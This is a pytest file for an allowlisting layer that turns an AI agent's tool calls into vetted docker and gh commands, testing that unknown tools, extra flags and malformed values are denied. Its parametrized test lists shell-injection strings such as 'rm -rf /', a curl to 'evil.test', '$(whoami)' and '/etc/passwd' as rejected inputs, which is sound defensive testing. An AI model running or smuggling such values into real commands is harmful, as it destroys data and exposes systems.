"""Tool invocation boundary: tool name + named arguments -> verified argv."""

from __future__ import annotations

import pytest

from citadel.policy import load_catalog
from citadel.tools import CommandDenied, build_argv, load_allowlist


def test_read_logs_builds_the_compose_logs_command() -> None:
    argv, command = build_argv("read_logs", {"service": "checkout-api"})
    assert argv == ["docker", "compose", "logs", "checkout-api"]
    assert command.id == "docker.compose.logs"
    assert command.tier == "T0"


def test_restart_service_builds_the_restart_command() -> None:
    argv, command = build_argv("restart_service", {"service": "checkout-api"})
    assert argv == ["docker", "restart", "checkout-api"]
    assert command.tier == "T1"


def test_flag_parameters_are_rendered_in_flag_value_form() -> None:
    argv, _ = build_argv("get_pr_status", {"repo": "acme/infra"})
    assert argv == ["gh", "pr", "list", "--repo", "acme/infra"]


def test_tools_without_a_command_cannot_execute() -> None:
    for tool in ("search_code", "open_remediation_pr"):
        with pytest.raises(CommandDenied, match="no allowlisted command"):
            build_argv(tool, {})


def test_unknown_tool_is_denied() -> None:
    with pytest.raises(CommandDenied, match="not in the catalog"):
        build_argv("exfiltrate_secrets", {})


def test_t2_tool_never_executes() -> None:
    with pytest.raises(CommandDenied):
        build_argv("delete_volume", {})


def test_required_argument_is_enforced() -> None:
    with pytest.raises(CommandDenied, match="requires argument"):
        build_argv("restart_service", {})


def test_extra_arguments_are_rejected() -> None:
    """The model cannot smuggle extra flags through the argument map."""
    with pytest.raises(CommandDenied, match="unexpected arguments"):
        build_argv("read_logs", {"service": "checkout-api", "extra": "--privileged"})


@pytest.mark.parametrize(
    "value",
    [
        "checkout-api; rm -rf /",
        "checkout-api && curl evil.test",
        "$(whoami)",
        "`id`",
        "a|b",
        "/etc/passwd",
        "..",
        "with space",
        "",
    ],
)
def test_malformed_argument_values_are_denied(value: str) -> None:
    with pytest.raises(CommandDenied):
        build_argv("read_logs", {"service": value})


def test_overlong_argument_is_denied() -> None:
    with pytest.raises(CommandDenied, match="exceeds"):
        build_argv("read_logs", {"service": "a" * 100})


def test_non_string_argument_is_denied() -> None:
    with pytest.raises(CommandDenied, match="must be a string"):
        build_argv("read_logs", {"service": 123})


def test_every_registered_command_is_allowlisted() -> None:
    ids = {entry.id for entry in load_allowlist()}
    for name, spec in load_catalog().items():
        if spec.command is not None:
            assert spec.command in ids, f"{name} points at unknown command {spec.command}"


def test_definitive_secret_commands_are_not_registered_as_tools() -> None:
    """The caveat is enforced, not just documented.

    docker inspect and docker compose config disclose secrets by design, so no
    tool may point at them until the DLP wrapper redacts their output.
    """
    risky = {c.id for c in load_allowlist() if c.content_risk == "definitive"}
    assert risky == {"docker.inspect", "docker.compose.config"}
    for name, spec in load_catalog().items():
        assert spec.command not in risky, f"{name} is wired to a secret-disclosing command"


def test_allowlist_marks_output_risk_for_documented_commands() -> None:
    risk = {c.id: c.content_risk for c in load_allowlist()}
    assert risk["docker.inspect"] == "definitive"
    assert risk["docker.compose.config"] == "definitive"
    assert risk["docker.compose.logs"] == "possible"
    assert risk["docker.ps"] is None
